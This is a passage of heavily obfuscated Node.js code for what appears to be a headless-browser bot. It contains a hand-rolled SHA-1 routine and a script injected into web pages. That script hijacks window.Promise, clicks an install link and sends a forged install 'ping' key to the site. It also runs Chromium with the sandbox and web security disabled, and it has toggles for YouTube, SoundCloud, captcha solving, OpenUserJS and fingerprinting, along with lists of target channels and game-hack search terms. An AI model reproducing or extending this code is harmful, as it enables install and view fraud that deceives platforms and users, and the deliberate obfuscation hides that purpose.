+ 0x38ae] |= (0x12d + -0x3 * 0x9bd + 0xe45 * 0x2 | -0x19b5 + -0x123a * -0x1 + -0x2b * -0x2e & L) << y[0x3 * -0x767 + -0x2182 + -0x7f6 * -0x7 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0xc3 * -0xd + -0x8d7 + 0xdd * 0x16 ? (this['block'] = P[0x124d * 0x2 + -0xc * -0x2d7 + 0x469e * -0x1], this['start'] = N - (0x458 + 0x17 + 0x7 * -0x99), this['hash'](), this['hashed'] = -0x7eb + -0xcd * -0x2e + 0xe75 * -0x2) : this['start'] = N;
                }
                return this['bytes'] > 0xa7 * -0x20686a5 + 0x118e3c1cf * 0x1 + 0x1395e13d3 && (this['hBytes'] += this['bytes'] / (-0x7f9f899c + 0x10b0a19 * -0x120 + -0x25c5d9 * -0x121c) << -0x1c79 + 0x1 * -0xad9 + 0x2752 * 0x1, this['bytes'] = this['bytes'] % (0x2e829ae4 + 0x9adba7a8 + -0xa * -0x57692f2)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x147 * 0x6 + -0x297 * 0x2 + 0xcd9;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0xa13 + -0x396 + -0x66d] = this['block'], J[K >> -0x19 * -0xfd + 0x2272 + -0x93 * 0x67] |= x[-0x1 * 0x1991 + 0x202f + -0x69b & K], this['block'] = J[-0x1 * 0xb57 + 0x79 * -0x31 + 0x2290], K >= -0x7b7 * 0x2 + -0xd + 0x1 * 0xfb3 && (this['hashed'] || this['hash'](), J[-0x3b * 0x67 + -0x167d + 0x7a * 0x61] = this['block'], J[-0xc29 + 0x11 * -0x12e + -0x2047 * -0x1] = J[0x2cd * 0x8 + 0x8 * -0x2ba + 0x1 * -0x97] = J[-0x853 * 0x3 + -0xd * 0x1c4 + 0x2fef * 0x1] = J[0x3 * -0xa65 + -0x1 * 0x1817 + 0x3749] = J[0x67 * -0x4b + -0x135c + 0x318d] = J[0x1f54 + -0x2702 + 0xdb * 0x9] = J[0x1887 + -0x2a7 * -0xd + 0xebf * -0x4] = J[0x27 * -0xa3 + -0x2347 + 0x3c23] = J[0x9d * -0x1d + -0x32a + -0x1 * -0x14fb] = J[-0x23ff * -0x1 + -0x54f * 0x6 + 0x1 * -0x41c] = J[0x2159 * -0x1 + 0xdb4 + 0x13af] = J[-0x200e + 0x1837 + -0x7e2 * -0x1] = J[-0x15 * -0xde + -0x2036 * 0x1 + 0x1 * 0xe0c] = J[0x2 * 0x221 + -0x2631 + 0x21fc] = J[0x4 * 0x20e + 0x1 * -0x12c5 + -0xb5 * -0xf] = J[0x2701 + 0x38d + 0x1d9 * -0x17] = -0x1216 * -0x1 + 0xe01 * -0x1 + 0xb * -0x5f), J[0x1121 * 0x2 + -0x2 * 0xd14 + -0xa * 0xce] = this['hBytes'] << 0x1 * -0x4ca + -0xc16 + -0xb * -0x189 | this['bytes'] >>> 0x938 * 0x1 + -0x1 * -0x6fb + -0x1016 * 0x1, J[-0x1691 + 0x1491 + 0x20f] = this['bytes'] << -0x6b9 + 0x4 * 0x557 + -0x4 * 0x3a8, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1877 + 0x3cc * -0x3 + -0xd03; J < 0x33 * -0x60 + 0x2173 + -0xe03; ++J)
                K = Q[J - (0x1f54 + 0x169a + -0x35eb)] ^ Q[J - (0x3 * -0x8f1 + 0xf1 + 0x19ea)] ^ Q[J - (0xd3 + -0x214c + 0x2087)] ^ Q[J - (-0x3ab + 0xf68 + -0xbad)], Q[J] = K << -0x5 * 0x599 + 0x1a3e + 0x1c0 | K >>> 0x409 * 0x6 + -0x9 * -0x2d + -0x19ac;
              for (J = 0x1 * 0x9c7 + -0x2494 * 0x1 + -0x1 * -0x1acd; J < -0x17ad + -0x1 * 0x8a1 + 0x2062; J += 0x191 * 0xe + 0x1337 * 0x1 + -0x2920)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x111c + 0x1a17 + -0x8f6 | L >>> 0x1d17 + 0x3 * -0x9b5 + -0x23 * -0x1) + (M & N | ~M & O) + P + (-0x89ed680a + -0x29a9d2a5 + -0x2 * -0x870cda24) + Q[J] << -0x1b54 + 0x1 * -0x44e + -0x1fa2 * -0x1) << -0x273 + 0x43 * 0x1 + 0x235 | P >>> 0x157 * -0x8 + -0x1aeb + 0x25be) + (L & (M = M << -0xb * 0x37a + -0x1c * 0x10b + 0x4390 | M >>> -0x1244 + -0x1da + 0x4 * 0x508) | ~L & N) + O + (0x2dcf0512 + -0x755 * 0x182c6b + -0x1 * -0xddf1210e) + Q[J + (-0xa25 + -0x11c0 + 0x1be6)] << 0x1a02 + 0x4be * 0x1 + -0x1ec0) << -0x5bb * 0x4 + -0x19 + 0xb85 * 0x2 | O >>> -0x5 * -0x1f7 + -0x18d0 + 0x78c * 0x2) + (P & (L = L << 0x2f8 + 0xb72 + -0xe4c | L >>> 0x7b * -0x25 + 0xf81 + -0x4 * -0x92) | ~P & M) + N + (-0x9f59b * 0x263 + -0x4 * 0x2a2421ad + 0x11ad8313e) + Q[J + (0x1 * -0x6b2 + -0x1f07 + 0x25bb)] << 0x1ddb + -0x1d0a + 0x1 * -0xd1) << -0x1 * -0x2237 + 0x94d * 0x3 + -0x3e19 | N >>> -0x12c5 + -0x7fe + -0xb5 * -0x26) + (O & (P = P << 0x27 * -0x65 + -0xa7 * -0x11 + 0x46a | P >>> -0x18e * 0xf + 0x215d + -0xa09) | ~O & L) + M + (-0x8c9a3fe7 + 0x24404ab0 + -0xc5b0 * -0xfc57) + Q[J + (-0x2f + 0x2e3 + -0xd * 0x35)] << -0x1b33 + -0x8f + 0x1bc2) << 0x1c5c + -0xbc * 0x29 + 0x1c5 | M >>> 0xf94 + 0x22fa + -0x3273 * 0x1) + (N & (O = O << -0x382 + -0x4 * -0x697 + -0x16bc | O >>> 0x14c4 + 0xb47 * -0x1 + -0x97b) | ~N & P) + L + (0x48579683 + 0x835ecbe0 + 0x29 * -0x2c2d3ba) + Q[J + (0x20d1 * -0x1 + -0x1631 + 0x1b83 * 0x2)] << 0x17e1 + 0x8 * -0x6a + -0x1491, N = N << -0x1f02 + -0x1f37 + 0x3e57 * 0x1 | N >>> 0x12db + 0x952 + 0x1 * -0x1c2b;
              for (; J < -0x259d + 0x2f * 0x6f + 0x1164; J += 0x11f7 + -0x98 * 0x26 + -0x1 * -0x49e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x88 * 0x16 + -0x2509 + 0x195e | L >>> 0x29b + -0x1 * -0x1c96 + -0x1f16) + (M ^ N ^ O) + P + (-0x667000d3 + -0x82389acb + -0x15782873f * -0x1) + Q[J] << -0x47 * -0x18 + 0x18ea + -0x1f92 * 0x1) << -0x1789 * -0x1 + 0x10e9 + -0x1 * 0x286d | P >>> 0x5ae + -0x241d + 0x1 * 0x1e8a) + (L ^ (M = M << -0x2 * 0xbd3 + 0x491 * -0x5 + 0x1 * 0x2e99 | M >>> 0x1016 + 0x2d6 + -0x12ea) ^ N) + O + (-0x4 * -0x13a9189 + -0x351112 * -0x2bb + -0x26f5f6a9 * 0x1) + Q[J + (-0x1 * -0x120a + -0x11e2 + 0xd * -0x3)] << -0xa55 + -0x1 * 0x6fb + 0x1150) << -0x12ad * 0x1 + 0x1 * 0xce5 + 0x5cd | O >>> 0xc5f * -0x2 + -0x2378 + 0x3c51) + (P ^ (L = L << 0x1f7b + -0x1 * -0x473 + -0x23d0 | L >>> -0x76 * 0x4c + 0x777 + 0x21f * 0xd) ^ M) + N + (-0x52e4492e + 0x2b21ff70 + 0x2159f * 0x4841) + Q[J + (0x490 * -0x5 + 0x6 * -0xfb + 0x1cb4 * 0x1)] << 0x1fb * 0x2 + 0x33 * -0x73 + 0x12f3) << 0x1 * 0x621 + -0x7e * -0x3e + -0x24a0 | N >>> 0x63f + -0x21fc + -0xd8 * -0x21) + (O ^ (P = P << 0xf1 * 0xe + -0xa3 * 0x1 + 0xc6d * -0x1 | P >>> 0x24bf + 0x14d5 + 0x2 * -0x1cc9) ^ L) + M + (0x5a8f891c + 0x270e56ed + -0x12c3f468) + Q[J + (-0x1 * -0x641 + -0xfe4 + -0x41 * -0x26)] << 0x1e * 0x79 + 0xd3a + -0x4 * 0x6da) << -0x64a + -0x21eb + -0x283a * -0x1 | M >>> 0xe73 * -0x2 + 0x21 * 0x5f + 0x4e * 0x37) + (N ^ (O = O << 0xba6 + -0xf4e + -0x2 * -0x1e3 | O >>> -0x2 * 0x8b3 + 0x1f * -0xaf + -0x1 * -0x2699) ^ P) + L + (-0x1 * -0x6f3c8da6 + -0x208b0f2d + 0xf22154 * 0x22) + Q[J + (0xc9a + 0x96e * 0x1 + -0x1604)] << 0x7b5 + -0x1ea1 * 0x1 + 0x28c * 0x9, N = N << 0x1410 + 0x1eff + -0x3f * 0xcf | N >>> 0x56 * 0xe + -0x2445 + 0x1f93;
              for (; J < -0x18e7 + -0x33 * -0x8e + -0x327; J += -0x7ea * 0x2 + -0x1c3e + 0x2c17)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1cab + -0x1 * -0x1e9e + -0x1ee | L >>> -0x161f + -0x13f0 + 0x2a2a) + (M & N | M & O | N & O) + P - (-0x1 * -0xb64af301 + -0xd334c3df + 0x2 * 0x46e70a01) + Q[J] << 0x18ee + 0x1 * 0xe41 + -0x272f) << -0x1191 * 0x2 + 0x34a * 0x1 + 0x1fdd | P >>> -0x1b99 + -0x1e40 + 0xe7d * 0x4) + (L & (M = M << -0x95 * 0x17 + 0x1f9c + -0x121b | M >>> 0x12ef + 0x1 * -0x19bb + 0x6ce) | L & N | M & N) + O - (0x37dfe7e9 + 0x58fe6f43 + -0x20add * 0xfa8) + Q[J + (0x35 * -0x56 + 0x8ca + 0x905 * 0x1)] << -0x1229 + 0x26e7 + -0x1e * 0xb1) << -0x160 * -0x5 + 0x1005 + -0x2dc * 0x8 | O >>> -0x61c * -0x2 + -0xef * -0x17 + -0x2196) + (P & (L = L << 0xc99 + 0x16 * 0x1ba + 0x3277 * -0x1 | L >>> 0x5c + -0x167c + 0x1622) | P & M | L & M) + N - (-0x399 * 0x129313 + 0x2 * -0x1230c9a7 + 0x2b383129 * 0x5) + Q[J + (0xe2c * 0x2 + -0x178c + 0x1 * -0x4ca)] << -0x253f + 0x7 * -0x1eb + 0x10e4 * 0x3) << 0x554 + -0x9ca + -0x25 * -0x1f | N >>> -0x13fc + -0x1 * 0x2200 + 0x3617 * 0x1) + (O & (P = P << -0x1 * 0x1bc7 + -0x240f + 0x3ff4 * 0x1 | P >>> 0xc43 + -0x2 * -0xa59 + 0x697 * -0x5) | O & L | P & L) + M - (0x60235601 + -0x97748f17 + 0x178b32 * 0x725) + Q[J + (0x2158 + -0xe * -0xb3 + -0x2b1f)] << -0x22d6 + -0x1c11 + 0x3ee7) << -0x19fe + -0x19f + -0x1 * -0x1ba2 | M >>> 0x1 * -0x1139 + 0x128f + 0x5 * -0x3f) + (N & (O = O << 0x1 * -0x1b7c + 0x19aa * 0x1 + 0x1f0 | O >>> -0xd * 0xa7 + -0x2063 + 0x28e0) | N & P | O & P) + L - (-0xd3072c0 + 0x1 * -0x763262d5 + 0x41027 * 0x3c1f) + Q[J + (-0x25ce + 0x1928 + 0x655 * 0x2)] << -0x4e9 * 0x7 + 0x9 * 0x1a5 + 0x1392, N = N << 0x1d52 + 0x101f + -0x2d53 | N >>> 0x79f + -0x8e1 + 0x144;
              for (; J < -0x2588 + -0x1 * 0x21d + -0x35 * -0xc1; J += -0x1433 + 0x481 * -0x4 + -0x2 * -0x131e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x23c4 + -0x342 * -0x4 + 0x16c1 | L >>> -0x13 * -0x31 + -0x1164 + 0x2 * 0x6ee) + (M ^ N ^ O) + P - (0xae9ce * -0x179 + 0x507cb95f * -0x1 + 0x962c47e7) + Q[J] << 0x1733 + 0x1 * 0xe29 + -0x255c) << -0xd25 * -0x1 + -0x1e6f + 0x114f | P >>> -0x4 * -0x976 + -0x151a * 0x1 + -0x10a3) + (L ^ (M = M << -0x1 * 0xc1 + 0x134 + -0x55 | M >>> -0x9f5 + 0x1 * -0x167b + 0x2072) ^ N) + O - (0x271a6a62 + -0x1 * -0x278f9eed + -0x190ccb25 * 0x1) + Q[J + (0x704 + 0x1603 + -0x1d06)] << -0x1505 + -0x3 * -0x133 + 0x8b6 * 0x2) << 0xccc + 0x9e7 + -0x16ae | O >>> -0x81a + -0xd1c + 0x1 * 0x1551) + (P ^ (L = L << -0x2 * -0xc81 + 0x2499 + -0x9f * 0x63 | L >>> -0x12 * -0x157 + -0x219d + -0x32b * -0x3) ^ M) + N - (-0x5ee806b + 0x4ed55509 + -0x14ec07 * 0xec) + Q[J + (0x1f6f + 0x12f8 + -0x3265)] << -0x17e7 + 0x87b * -0x1 + 0x1031 * 0x2) << -0x1781 + 0x1 * -0x5b3 + 0x1d39 * 0x1 | N >>> -0x20eb + -0x23a5 + -0x44ab * -0x1) + (O ^ (P = P << 0x339 + -0xfd7 + 0xcbc | P >>> 0x2449 + 0x40 * 0x5 + 0xd * -0x2e3) ^ L) + M - (-0x59cb48c3 + 0x1 * 0x3dac072f + 0x51bc7fbe) + Q[J + (-0x1 * -0xda1 + 0xa6 * 0x1a + -0x1 * 0x1e7a)] << -0xe01 + 0x649 * 0x5 + -0x116c) << 0x7 * 0x163 + 0xb8d + -0x1 * 0x153d | M >>> 0x5d9 + -0xcec * 0x1 + -0x1 * -0x72e) + (N ^ (O = O << 0x1dc + 0x10e8 + -0xd9 * 0x16 | O >>> 0x10 * -0x167 + 0x8 * -0x1e4 + 0x2592) ^ P) + L - (-0x254 * -0xe5abd + -0x329c7e22 + 0x123c64 * 0x3e2) + Q[J + (0x43 * 0xb + 0x220a + -0x8d * 0x43)] << -0x36 * 0x9a + -0xffd * -0x2 + 0x82, N = N << -0x1f0 + -0x19b5 + -0x67 * -0x45 | N >>> 0x71f * 0x3 + 0x2 * 0x122b + -0x39b1;
              this['h0'] = this['h0'] + L << -0x33 * -0x61 + -0xcfb + -0x1d * 0x38, this['h1'] = this['h1'] + M << 0xb * -0x189 + -0x1aae + 0x13 * 0x24b, this['h2'] = this['h2'] + N << -0x1065 + 0x55f + -0x22 * -0x53, this['h3'] = this['h3'] + O << -0x52 * -0x1d + 0x23ec + 0xf12 * -0x3, this['h4'] = this['h4'] + P << 0xf * 0xf1 + 0x68 * 0x4 + -0xfbf;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x265c + -0x1e5c + 0x44d4 & 0x642 + -0x27 * -0xa3 + -0x1f08] + w[J >> -0x195b + -0x242f + -0x8ce * -0x7 & 0x2440 + -0x3 * 0x671 + -0x10de] + w[J >> -0x1af7 * -0x1 + -0x103b + -0xaa8 & -0x4e8 * -0x2 + 0x827 + 0xc * -0x17e] + w[J >> -0x8b7 * -0x1 + -0x6a9 + -0x2 * 0xff & 0x1594 + 0x2167 + -0x13 * 0x2e4] + w[J >> 0x855 * -0x3 + -0x1828 + -0x5 * -0x9d7 & 0x2 * 0xe12 + 0x5 * 0x39a + -0x2e17] + w[J >> 0x85 * -0xf + -0xba7 + 0x12 * 0x115 & 0x83 * -0x9 + -0x21af * -0x1 + -0x1d05] + w[J >> -0x22d * 0x7 + -0x2 * -0x838 + -0x131 & 0x1c * 0x12b + -0x2 * 0x4e6 + -0x16d9] + w[-0x829 + 0xeab * -0x1 + 0x16e3 & J] + w[K >> 0x359 * -0x9 + 0x269c + -0x85f & 0x1fe6 * -0x1 + 0x2 * -0xfbd + 0x3f6f] + w[K >> 0x448 * -0x2 + -0x16f1 + -0x1f99 * -0x1 & 0xb32 * -0x1 + 0x6 * 0x381 + -0x9c5] + w[K >> 0x9a * -0x2 + -0x4ca + -0x15 * -0x4a & 0x7fc + -0xd7b * 0x2 + 0xb * 0x1bb] + w[K >> 0x305 * -0x4 + 0xe + 0xc16 & 0x2bf + -0x6a + -0x246] + w[K >> -0x2705 + -0x91 + 0x27a2 & 0xbb3 + -0x667 + -0x53d * 0x1] + w[K >> 0x4 * 0x17b + 0x122b * -0x2 + 0x1e72 & 0x3 * -0xb51 + 0x2239 + -0x37] + w[K >> -0x1fd * -0x1 + -0xd56 + -0x1 * -0xb5d & 0x1 * -0xae + -0x280 * -0x4 + -0x1 * 0x943] + w[0x26b7 + -0x3 * -0xb9b + 0x4979 * -0x1 & K] + w[L >> -0x2193 + 0x1e67 + 0x348 & -0x26fd * -0x1 + 0x1df4 + -0x44e2] + w[L >> 0x2 * -0x104f + -0x22a * -0x1 + 0x1e8c & -0x386 * -0x1 + -0x22b9 * -0x1 + -0x2630] + w[L >> -0xc11 * -0x1 + 0x9f1 * -0x2 + 0x7e5 & -0x1b4d + 0x317 * 0x2 + 0x152e] + w[L >> 0x609 + -0x21 * -0xde + -0x2297 & 0xe2a + 0x1da8 + -0x2bc3] + w[L >> -0x196 * -0x3 + -0x1145 * -0x2 + -0x2740 & 0x1631 + -0x1ec1 + 0x89f * 0x1] + w[L >> 0x20b1 + 0x7f * 0xd + -0x138e * 0x2 & -0x2b8 + -0xf0 + 0x3b7] + w[L >> -0x8e7 + -0x265e + 0x2f49 & -0x1 * 0x1537 + 0x8d1 + 0xc75] + w[-0xa * -0x145 + 0x1c50 + -0x28f3 & L] + w[M >> 0x784 + 0x8c8 + -0x206 * 0x8 & 0x1a05 + -0x8ea + -0x110c * 0x1] + w[M >> -0x213a + 0x961 + -0xe3 * -0x1b & -0x241 * 0xa + -0x9e0 + 0x2079] + w[M >> -0x1a * 0xa + 0x21de + -0x20c6 & 0xcd1 * 0x1 + 0x1d12 + -0x29d4] + w[M >> -0x2465 + -0x1b97 + 0x400c & -0x15ca + 0x97 * 0x17 + -0x28 * -0x35] + w[M >> -0x1177 + -0x24d1 + 0x1 * 0x3654 & -0xa2c + -0x2 * -0x817 + -0x5f3 * 0x1] + w[M >> -0x19c * -0x3 + -0x1e73 * 0x1 + -0x1 * -0x19a7 & 0x19 * -0x43 + -0x171f + 0x7 * 0x43f] + w[M >> 0x395 * -0x1 + -0x4 * -0x14b + -0x193 & -0x187e + -0x383 + -0x382 * -0x8] + w[0x3f2 + 0x1a3a + -0x1e1d * 0x1 & M] + w[N >> 0xc * 0x4f + -0x154b * -0x1 + 0x1 * -0x18e3 & -0x8 * -0x1be + 0x2164 + -0x2f45 * 0x1] + w[N >> -0x25 * -0x4a + 0x21df + 0x9 * -0x4f1 & -0x416 * 0x8 + 0x21f * 0x9 + -0x8 * -0x1b5] + w[N >> -0x2 * 0x856 + 0x26 * 0x26 + 0xb1c & 0x1799 + -0x1ceb * -0x1 + -0x3475] + w[N >> -0x1b8e + -0x7 * 0x17 + 0x1c3f & 0x4f3 + -0x1885 * -0x1 + 0x1d69 * -0x1] + w[N >> 0xd * -0x2fa + 0x238f * 0x1 + 0x32f & -0x1500 + -0x156b + 0x2a7a] + w[N >> 0x82 * -0x29 + -0x2314 + -0x1bf7 * -0x2 & 0x1294 + -0x32 * -0x6b + -0x276b] + w[N >> -0x115e + -0x1841 + 0x29a3 & 0x2310 + -0x3c3 + -0x3e * 0x81] + w[-0x2 * -0x97a + -0x2105 + 0xe20 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x2b * -0x1a + -0x1071 + 0xc2b & 0x2 * -0x15d + -0x16ee + 0x1 * 0x1aa7,
                J >> 0x20ea + 0x2 * -0xff4 + -0xf2 & 0x7c * 0x3 + 0x263d + -0x26b2,
                J >> 0xef3 + 0x11ef + -0x20da & 0xeb4 * -0x2 + 0x7a3 + 0x16c4,
                -0xaca * -0x3 + -0x2b * -0x2d + -0x26ee & J,
                K >> 0x611 * 0x1 + 0x7 * 0x30e + 0x1 * -0x1b5b & -0xc64 + -0x406 + 0x1169,
                K >> -0x3a1 + -0xc0f + 0xfc0 & 0x132f + 0xe * -0x73 + -0xbe6,
                K >> -0x86c + -0xfff * -0x1 + -0x78b & 0x228b + 0x2213 + -0x439f,
                0x2188 + 0x1ca4 + -0x3d2d & K,
                L >> -0x3 * 0x67 + 0xb24 + 0xe5 * -0xb & 0x1744 * -0x1 + -0x1954 + 0x3197 * 0x1,
                L >> 0x19 * 0x107 + -0x1173 + 0x1 * -0x82c & 0xfe * 0x14 + -0xef2 + -0x3e7,
                L >> -0x417 * -0x6 + -0x19c9 + -0x6d * -0x3 & -0x1afc + 0x1136 * -0x2 + -0x163 * -0x2d,
                0xac * 0xa + 0x25f5 + 0x15d7 * -0x2 & L,
                M >> -0x200b + 0x927 + -0x5bf * -0x4 & 0x6f * 0x48 + -0x1cf3 * 0x1 + -0x2 * 0xa3,
                M >> -0x2166 + -0x22d0 + 0x4446 & 0x145 * 0x14 + 0x199a + -0x31ff,
                M >> 0x5 * -0x4cb + 0x1 * 0xb55 + 0xcaa * 0x1 & -0x2143 + 0x2 * 0x4e8 + 0x1872,
                -0xbde + 0x4 * 0x569 + -0x7 * 0x141 & M,
                N >> 0x1e2 + 0x2190 + -0x235a & 0xf4 * -0x1c + -0x35e * 0x6 + -0x29 * -0x12b,
                N >> 0x2f * -0x9 + -0x1365 + -0x547 * -0x4 & -0x1069 * -0x1 + -0x655 + -0x915,
                N >> -0xeb6 + -0xb24 + 0x1 * 0x19e2 & -0x13c + -0x1 * -0xa70 + 0xb * -0xbf,
                -0x1 * -0xbf + 0x6f * -0x5 + 0x1 * 0x26b & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1 * 0x836 + -0x191c + 0x23a * 0xf), (K = new DataView(J))['setUint32'](-0x1 * 0x1c5d + -0x23a + 0x1e97 * 0x1, this['h0']), K['setUint32'](-0x1 * -0xfb3 + -0xb5 * 0x2 + -0xe45, this['h1']), K['setUint32'](-0x3df + 0x35 * -0x89 + -0x24e * -0xe, this['h2']), K['setUint32'](0x15db + -0x1 * -0x11b + -0x16ea, this['h3']), K['setUint32'](0x1426 * -0x1 + 0x12c + 0x130a, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1d * 0x125 + 0x18 * 0x10 + -0x22b1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x2573 * 0x1 + 0x22ff + -0x4872;
            J[0x45 * -0x49 + -0xb0b + 0x3d7 * 0x8]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1789 + -0x9 * 0x2bb + -0x301c * -0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x733 + 0xd * 0x203 + -0x2159), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0xb6 * 0x11 + 0x3c7 * -0x7 + 0x2688;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x26c8 + 0x163d * -0x1 + 0x223 * -0x5), Promise['resolve'](-0xbcf * -0x3 + 0x1 * -0xe60 + -0xa86 * 0x2);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x3 * -0xbd3 + -0x1a6a + -0x3de3 * -0x1; j < 0x5a0 + -0x3 * 0xf7 + -0x2ba; j++)
    i();
}
const NETWORK_PATIENCE = 0xf1b * -0x4 + 0x3d * 0x1f + 0x5449 + (-0x4 * 0x752 + 0x146e + -0x1 * -0x1492) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x256c + 0x2 * -0x8c6 + 0x1 * -0x13dd) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function a() {
  const bn = [
    'CMCVzw4VC2nYAq',
    'cCaIVrltHz',
    'WQBdMsxcJW',
    'rghcMSk7WOvlA8o9aG',
    'W5ujjx9HEhXmWP18',
    'vmolW4hdTgWxB0/cHmkA',
    'BE%E5%99%A',
    'ChrZl2j5lxnPDa',
    'm0TVwKDrAvK2tG',
    'W7Kvjfrx',
    'ig5LDYb1CgrHDa',
    'pts/444523',
    '_Mb8oQtSBW',
    't22jhowMom',
    'tMf2AwDHDgLVBG',
    'pts/by-sit',
    '44c4b4eaab',
    '-requestho',
    'W43cVuqfwSkYvIGghq',
    'hxTAtmkJdmkJW6dcOmoY',
    'direct',
    'Bsi7DJ0I',
    'tor',
    'ChrZlZqWnZK5na',
    'lsvfnsu4qsu5qG',
    'Aw5KzxHpzG'
  ];
  a = function() {
    return bn;
  };
  return a();
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  const W = b;
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1d2 * -0xb + -0x209a + 0x2e * 0x46; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array[W(0x3, '(@c7')]['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + X(0x13, 'sM6j') + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + Y(0xa) + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + 